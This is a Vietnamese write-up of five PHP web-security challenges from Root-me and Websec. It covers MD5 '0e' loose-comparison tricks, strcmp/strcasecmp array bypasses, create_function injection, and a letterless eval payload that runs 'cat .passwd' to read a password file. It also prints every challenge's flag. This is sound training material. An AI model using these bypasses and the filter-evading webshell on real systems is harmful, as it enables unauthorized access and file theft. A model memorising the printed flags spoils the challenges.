# 1.PHP - Loose Comparison(Root me)
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331197058_583316213683312_8175788506973310490_n.png?stp=dst-png_p206x206&_nc_cat=103&ccb=1-7&_nc_sid=aee45a&_nc_ohc=WVHml6kiWvsAX9xuqKM&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTTJy3pEnKNrnmRPMinuznGWmuj1NZHBgWD1emP-Pm82g&oe=641C5F91)

Link challenge : [http://challenge01.root-me.org/web-serveur/ch55/index.php](http://challenge01.root-me.org/web-serveur/ch55/index.php)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331946676_720451759621314_1492044808517406992_n.png?stp=dst-png_s480x480&_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=M6h4ZZHKV-0AX-FZe83&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQ5ElleU1EnGZC0UBI7q7_ornT9vp-kvv0b_VYuxu_Z0g&oe=641A9BB0)

Bài này họ cho mình source code:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331054428_499616775704281_2603774722559533476_n.png?stp=dst-png_s480x480&_nc_cat=105&ccb=1-7&_nc_sid=aee45a&_nc_ohc=Zl1Z5pEO3kIAX_XZlRy&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTu1LFEcQncC5dEHNsKS2OTI-EvbtIEvB9P6rDTT4mv3Q&oe=641ADEC3)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331399571_950122519679699_3428005718833600790_n.png?stp=dst-png_s552x414&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=8FGBNSs-vfsAX8pXT20&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSRQVv7j_aKwWalZ7tIquYy3dngMQ_6gCI9ZtVf0nV_vw&oe=641AF95C)

Ở đây họ sử dụng phép so sánh lỏng lẻo giữa md5 với string:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331160075_3466141907004678_2032970850044035275_n.png?stp=dst-png_p206x206&_nc_cat=103&ccb=1-7&_nc_sid=aee45a&_nc_ohc=j11zbGD0X2gAX_SgZH8&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQrfyQCtrD2T5LVkDyfHzgtJJfzqWJOTN8JLo-gsg7HYQ&oe=641AA0AB)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331893169_1565540110518067_963177314793821191_n.png?stp=dst-png_s417x417&_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=jMXFqIpU2QcAX9zuC_o&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQKt-AE1iIpvAJ3E05B6h9sxFEJYfSCXHxz1tRFVoNkHw&oe=641AA270)

Ở đây mình sẽ sử dụng giá trị `0e*****` vì md5 có thể return ra giá trị này.
### Php
```PHP
$input = "QNKCDZO";
echo md5($input);
//--> 0e830400451993494058024219903391
```
Tiếp theo mình cần làm giá trị `$s.$r = 0e*****`.Đọc code thì mình thấy `$x.$r` đang cộng chuỗi lại với nhau `$r` là một số random còn `$x` là chuỗi mình nhập từ ô input

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331471590_525372436384474_7072400312905970379_n.png?stp=dst-png_s552x414&_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=l-tcn-A-F7gAX_JTA7a&_nc_oc=AQlcBduXTYjitrBWBHKEdeE4xZzqzTzOYLGese5UJ5bcc2TlHpfixnG3wrlHTicd1Mbsk_nE4PzGac3R4IMmhJNQ&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdT89HtxWwSbNwFzk_s9AIUqsBiJPBW45E2itx8zswfTXw&oe=641AAD5A)

Khi mình nhập chuỗi `0e` thì `$x.$r` có thể bằng `0e158340`.
Khi đó điều kiện so sánh sẽ là:
```Php
$x.$r == $h // 0e158340==0e830400451993494058024219903391 -> True
```
>Flag: F34R_Th3_L0o5e_C0mP4r15On*  

# 2.PHP - type juggling(Root me)
Link challenge: [http://challenge01.root-me.org/web-serveur/ch44/](http://challenge01.root-me.org/web-serveur/ch44/) 

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331912129_1629596314165218_4870990480733112814_n.png?stp=dst-png_p206x206&_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=uBs0ZFy6__sAX_0Pkb3&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRU_GaHm0NwlxVaDTDMxlEc4ogGCFyrPS57aODMdBLpkA&oe=641AED98)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331041631_713138443889627_1211548030858628261_n.png?stp=dst-png_p206x206&_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=SL4tXkflqrUAX8P7i8V&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRSgkIABYCzvFAJTzBVAAt5PTpcOiu9icB_a6PeiVZ8dg&oe=641AD133)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331424420_1364409767626698_6342400942383887272_n.png?stp=dst-png_p206x206&_nc_cat=104&ccb=1-7&_nc_sid=aee45a&_nc_ohc=J0ruxVXukMsAX9zxQdD&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQ2RMUlzDxnyaVYXQDe_qDVmhfXXH8PlPd4rXE8tJGFow&oe=641AFDC9)

Bài này mình có 2 điều kiện phải vượt qua.
Thứ nhât `$auth['data']['login']==$User` để vượt qua mình cần tìm các giá trị `==` String thì ta có các giá trị thỏa mãn `true,0`

Điều kiện thứ 2 `!strcmp($auth['data']['password'],$PASSWORD_SHA256)` để điện kiện này đúng thì hàm `strcmp` phải trả về giá trị `0` vì `!0:true`
Để `strcmp(a,b)` trả về `0` thì chuỗi a phải bằng chuỗi b
```Php
strcmp(array(),string)==0
strcmp(new stdClass,string)==0
strcmp(function(){},string)==0
```
Mình dùng `Burp Suite` để bắt request gửi lên thì nhận được:
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/330971126_876654070260451_2403855337868928187_n.png?stp=dst-png_p206x206&_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=TQUuEtiTomYAX_eGnn8&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdS_RgaCiIZ9N5TQXH8_RObcvpwAehuX7mqL6226Oyw8vw&oe=641C42ED)

Bây giờ mình chỉnh lại dạng như mình nêu ở trên sẽ được là:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/331973459_5880349898685432_4513628716801484241_n.png?stp=dst-png_p206x206&_nc_cat=105&ccb=1-7&_nc_sid=aee45a&_nc_ohc=KWRHRKkiH_0AX8Orb3N&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdT2hz3R41Jg7BL_s8B4sggiJb34Yd6h6ZAOegTJyzfFvA&oe=641C526C)

Mình nhận được flag

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332088504_576226954424606_3460610629111151554_n.png?stp=dst-png_s350x350&_nc_cat=101&ccb=1-7&_nc_sid=aee45a&_nc_ohc=Y0jrKDbyLh8AX-TD857&_nc_oc=AQnWcFhTr4v2b37saSDDwF_cRMcJH--OucBAJI0aWnr9pN3YzjWRMAs-E994arMk7Sw0iro23Znn5OIUIPBy8To1&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTuFxy_YDpzvKeOsQfUM7pgZxxe2ENaHdovlTYiIcbfYg&oe=641C46B4)

>Flag: DontForgetPHPL00seComp4r1s0n

# 3.Php-Eval(Root me)
Link challenge : [http://challenge01.root-me.org/web-serveur/ch57/](http://challenge01.root-me.org/web-serveur/ch57/)
>Note : the flag is in .passwd file.
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332696625_560935455984646_1976042371579914474_n.png?stp=dst-png_p206x206&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=-TPtsSdL2-sAX8Bet8B&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTD_w8DnBXCQ5uMPn0SvyQZdAq5_1XQbgzQbJkqUz374w&oe=641D404F)

Hàm `eval` là hàm sẽ thực thi đoạn code trong php.Như vậy để đọc được file `.passwd` thì ta chỉ cần truyền `system("cat .passwd")` là được,tuy nhiên thì nó không cho mình nhập chữ cái.
Sau khi search google thì mình tìm được cái này:[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)
Ở đây thì chỉ được chữ hoa nên mình cần dùng hàm `strtolower()` để chuyển sang chữ thường.
```Php
<?php
#Tạo một mảng trống
$_=[];
#Chặn thông báo lỗi và chuyển mảng thành chuỗi
$_=@"$_";
#Lấy kí tự A
$_=$_[0];
#Muốn lấy các ký tự  sau thì cộng thêm 1 đơn vị
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;//S
$___ = $__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// Y
$___.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// S
$___.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// T
$___.=$__;

$__=$_;
++$__;++$__;++$__;++$__;//E
$___.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// M
$___.=$__;


$____='';
$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;//S
$____.= $__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// T
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// R
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// T
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// O
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// L
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// O
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// W
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;//E
$____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// R
$____.=$__;


$_____='';
$__=$_;
++$__;++$__;//C
$_____.=$__;
$_____.=$_;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// T
$_____.=$__;
$_____.=' .';

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// P
$_____.=$__;
$_____.=$_;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// S
$_____.=$__;
$_____.=$__;

$__=$_;
++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;++$__;// W
$_____.=$__;

$__=$_;
++$__;++$__;++$__;//D
$_____.=$__;

$___($____($_____));

?>
```
Payload mình gửi lên:
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332597737_901025954272413_2274768771235596410_n.png?stp=dst-png_p206x206&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=DGTcNB5iOZQAX_2CPUG&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdS012pkqJEsBmlrUxaD07d1t0wPtqXaLHJtP7nFsoF2wQ&oe=641D6551)

>Flag : M!xIng_PHP_w1th_3v4l_L0L

# 4.Level Seventeen(Websec)
Link challenge: [https://websec.fr/level17/index.php](https://websec.fr/level17/index.php)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332366677_877873180107770_3387297940738200425_n.png?stp=dst-png_s720x720&_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=1AwoJEGEEZQAX927c-o&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQ6FCZ-qcwFbZd4hv7q9U_J3FIR3-VP34DTOE68An3rwA&oe=641D7089)
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332157452_723177469536028_6985372444639262367_n.png?stp=dst-png_s640x640&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=N5M9zdqQlwIAX9Zvguw&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQpOvp5QSlDk2H4FGIPLEm9UBcoxmCx5x61bIlQOb5-pQ&oe=641D61DA)

Câu lệnh `strcasecmp()` là hàm so sánh hai chuỗi ký tự mà không phân biệt chữ hoa chữ thường.Nếu đúng sẽ trả về `0` và `!0==true` vì thế ta cần truyền payload vào cho `strcasecmp()==0`.Mình thấy nó cũng tương tự như `strcmp()` nên mình sẽ có trick tương tự
```Php
strcasecmp(array(),string)==0
strcasecmp(new stdClass,string)==0
strcasecmp(function(){},string)==0
```
Ở đây ban đầu mình nhập `payload = []` thì nhận được `Invalid flag, sorry`.Sau đấy mình dùng `burp suite` để sửa payload sẽ được là:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332634225_1197783734191718_6717795892976026373_n.png?stp=dst-png_s552x414&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=7FI3e6g1a4EAX9WqzPW&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTEaKo88EXXMH-cCLv1PddExrWI-6h2z_eNhp7VJPl1-Q&oe=641D5F0C)

> Flag : WEBSEC{It_seems_that_php_could_use_a_stricter_typing_system}

# 5.Level Fifteen(Websec)
Link challenge: [https://websec.fr/level15/index.php](https://websec.fr/level15/index.php)
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332349718_885161442601627_5889874604814125654_n.png?stp=dst-png_p206x206&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=Sx8HOrkMOLoAX-JLU-D&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRqjrYLDOrIzf9Ip-WQnic9yBlIFNIYPgBxRHe16jEVyA&oe=641DB06B)
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332374904_211149611407232_5709038604109091927_n.png?stp=dst-png_p206x206&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=5gQ6Vl7CF0IAX9HXMdS&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRC_s-hzvGYr6GWx8X5I3tFgLYdJLD38nXSKgC4DROY1Q&oe=641DAB99)

Ta thấy thì khi ta gửi payload `c` lên thì server tạo một hàm function  `create_function`.Ở đây chúng ta cần biết `create_function` hoạt động như nào.
### PHP
```Php
$fun = create_function('$flag',$_Post['c']);
Tương đương với:
$fun = function($flag){
    $_Post['c']
}
```
Nên ở chúng ta có thể chèn giá trị `c` vào có thể là:
```Php
$fun = create_function('flag','} echo $flag;{');
Sẽ tương đương với:
$fun = function($flag){} 
echo $flag;
{}
```
Và chúng ta biết hàm `create_function` sẽ thực hiện bên trong eval();
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/332443105_593466208979253_7271736613310573283_n.png?stp=dst-png_s526x296&_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=GgzSQdIWV24AX9xoYKV&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdS-LkNFO52is0QPG6togdK-k_I_xtRyCUJnEuNJDaxIRA&oe=641DC7EE)
>Flag:WEBSEC{HHVM_was_right_about_not_implementing_eval}
